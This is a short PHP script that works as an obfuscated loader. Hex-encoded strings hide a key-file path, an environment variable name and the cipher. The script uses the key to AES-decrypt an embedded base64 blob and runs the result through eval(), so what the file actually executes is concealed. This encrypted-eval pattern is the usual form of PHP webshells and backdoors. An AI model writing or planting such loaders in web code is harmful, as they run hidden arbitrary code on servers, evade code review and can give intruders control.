<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('/2X7+4IvI1fp5mqnGgYpNg==');

$c=base64_decode(

'EPydkQPdFIO8ruvJ8l7y7di0gYwak6zjPVD8heh+PYltgJEbzQgoLhHafR3FQcHLO0mHxOt/dTlF' .
'Vv+d7n7OrB4qaeyO+wVd9iPzT9EVcSecLnkYoSABrm5rdMooKSdqXAZWTtURqTXrMNwpyDnUTo2J' .
'hztQymshOMgZXebWhQ6BGNFoTvu8EIEo/6ItOBR+LY8zkLNlJre8IABpiWuOOhtY/LARups+e2ug' .
'szmaVZarQUr/4c6ys0Hl5Dz9m+eowhAj/hqBJdO3Bhjx/pSefdr0RthWFBWKT4NjXAmhLlV5mhQQ' .
'J4mkTivaahMhVtEncCxxXZECzzO54EQ1sHo+dVqbJiZz6fm22Qgkx9JqHCyTpdrg406lhTmKdD5m' .
'7CchunAWDXudMWBTZxwKEYTN/ER1KrPEJRuRe2c+5ruC03Lo+o1SKpJf98PT8JOsZeDT6UkHLxq6' .
'yqFBogSrmXtIYp+SIxZ6adUva19Zw6IKs+KC1Z3J4D0SPV4hSbn4Kzuxf3/MHXrqLTXyvoucKvkE' .
'rGisVToxGyKmilFPO1ZaNAaclBoXZJhw17/uXMgK1eIdUvE9DDEOWaZqOgaYG9+k4cKwQg+ABjya' .
'QXfkMN7r6ZS2hc0DLstgJtaa4MAxQCndh863Sx18Q+5ppchXpuIOWLtbPM3yN86Fpuul95C3Vqq9' .
'lpsDGkU+I7jiB7Mimo2+PDjkir4uMYL9wGvJdN1ypQ=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

